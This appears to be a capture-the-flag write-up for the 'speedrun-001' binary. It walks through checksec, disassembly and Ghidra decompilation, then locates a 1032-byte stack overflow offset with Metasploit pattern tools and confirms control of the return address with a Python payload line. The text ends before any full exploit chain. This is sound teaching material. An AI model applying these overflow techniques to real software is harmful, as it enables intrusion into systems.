# speedrun-001

Some basic file enumeration

```s
$ file speedrun-001 
speedrun-001: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=e9266027a3231c31606a432ec4eb461073e1ffa9, stripped
$ pwn checksec --file speedrun-001 
[*] 'speedrun-001'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

This ELF is statically linked and not stripped. Great. I determine the main function by finding the entry point of the application and go from there.

```s
gef➤  info file
Symbols from "speedrun-001".
Native process:
        Using the running image of child process 4673.
        While running this, GDB does not access memory from...
Local exec file:
        'speedrun-001', file type elf64-x86-64.
        Entry point: 0x400a30

gef➤  x/16i 0x400a30
=> 0x400a30:    xor    ebp,ebp
   0x400a32:    mov    r9,rdx
   0x400a35:    pop    rsi
   0x400a36:    mov    rdx,rsp
   0x400a39:    and    rsp,0xfffffffffffffff0
   0x400a3d:    push   rax
   0x400a3e:    push   rsp
   0x400a3f:    mov    r8,0x4019a0
   0x400a46:    mov    rcx,0x401900
   0x400a4d:    mov    rdi,0x400bc1
   0x400a54:    addr32 call 0x400ea0
   0x400a5a:    hlt
   0x400a5b:    nop    DWORD PTR [rax+rax*1+0x0]
   0x400a60:    repz ret
   0x400a62:    cs nop WORD PTR [rax+rax*1+0x0]
   0x400a6c:    nop    DWORD PTR [rax+0x0]
```

This gets me the main function starting at `0x400bc1`:

```c

undefined8
main(undefined8 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
    undefined4 param_6,undefined4 param_7,undefined4 param_8)

{
  short *psVar1;
  float10 *pfVar2;
  undefined8 extraout_RDX;
  undefined8 extraout_RDX_00;
  undefined8 extraout_RDX_01;
  undefined8 extraout_RDX_02;
  char *pcVar3;
  char *pcVar4;
  float10 *in_R8;
  long in_R9;
  undefined8 uVar5;
  
  pfVar2 = (float10 *)0x0;
  pcVar3 = (char *)0x0;
  FUN_00410590(&DAT_006b9360,0,2,0,(int *)in_R8,in_R9);
  pcVar4 = "DEBUG";
  psVar1 = FUN_0040e790((short *)"DEBUG");
  uVar5 = extraout_RDX;
  if (psVar1 == (short *)0x0) {
    pcVar4 = (char *)0x5;
    FUN_00449040();
    uVar5 = extraout_RDX_00;
  }
  uVar5 = FUN_00400b4d(pcVar4,pcVar3,uVar5,pfVar2,(long)in_R8,in_R9);
  FUN_00400b60(uVar5,param_2,param_3,param_4,param_5,param_6,param_7,param_8,pcVar4,pcVar3,
               extraout_RDX_01,pfVar2,in_R8,in_R9);
  FUN_00400bae(pcVar4,pcVar3,extraout_RDX_02,pfVar2,(long)in_R8,in_R9);
  return 0;
}


```

There is a lot to unravel and Ghidra does not do a good job of unraveling it. Instead I run the program and feed it a large buffer. Afterwards I'll view the backtrace.

```s
gef➤  bt                       
#0  0x0000000000400bad in ?? ()
...
```

Now we know which function contains the BOF. Viewing the function in Ghidra:

```c

void func_any_last_words(undefined8 param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4
                        ,undefined4 param_5,undefined4 param_6,undefined4 param_7,undefined4 param_8
                        ,undefined8 param_9,char *param_10,undefined8 param_11,float10 *param_12,
                        float10 *param_13,undefined8 param_14)

{
  undefined8 extraout_RDX;
  undefined4 extraout_XMM0_Da;
  undefined local_408 [1024];
  
  FUN_00410390("Any last words?",param_10,param_11,param_12,(long)param_13,param_14);
  FUN_004498a0();
  FUN_0040f710(extraout_XMM0_Da,param_2,param_3,param_4,param_5,param_6,param_7,param_8,
               (float10 *)"This will be the last thing that you say: %s\n",local_408,extraout_RDX,
               param_12,param_13,param_14);
  return;
}


```

There isn't really anything I can see going on here. You can see the buffer that we will overflow. Unfortunately, I don't understand how the overflow occurs. Fortunately, I don't need to to exploit it. 

GEF was actually reporting an incorrect offset of 840. Again, I don't know why this occurs. Decided to go old-school and use `pattern_create.rb` and `patter_offset.rb` from Metasploit:

```s
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
...
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6942356942346942
[*] Exact match at offset 1032
$ python3 -c "import sys;sys.stdout.buffer.write(b'A' * 1032 + b'B' * 8)"
...
gef➤  x/gx $rsp
0x7fffffffdaf8: 0x4242424242424242
```